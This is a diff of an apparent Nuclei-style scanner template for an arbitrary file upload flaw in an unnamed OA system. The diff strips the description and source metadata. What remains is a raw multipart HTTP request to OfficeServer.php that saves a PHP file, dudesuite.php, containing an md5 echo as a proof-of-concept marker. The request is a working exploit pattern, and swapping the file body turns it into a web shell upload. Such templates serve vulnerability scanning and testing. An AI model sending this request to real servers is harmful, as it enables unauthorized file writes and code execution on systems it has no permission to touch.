@@ -3,12 +3,8 @@ info:
   name: 某未知OA文件上传漏洞A
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yq5hdmc1ng9122p2'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yq5hdmc1ng9122p2
-    fofa: 暂无
 http:
 - raw:
   - 'POST /static/lib/weboffice/js/OfficeServer.php HTTP/1.1
@@ -17,14 +13,10 @@ http:
     Content-Type: multipart/form-data; boundary=----------398jnjVTTlDVXHlE7yYnfwBoix
 
 
-
-
     ------------398jnjVTTlDVXHlE7yYnfwBoix
 
 
     Content-Disposition: form-data; name="FormData"
-
-
 
 
     {"OPTION":"SAVEFILE","FILEPATH":"/dudesuite.php"}
@@ -37,10 +29,6 @@ http:
 
 
     Content-Type: image/jpg
-
-
-
-
 
 
     <?php echo md5(1);?>
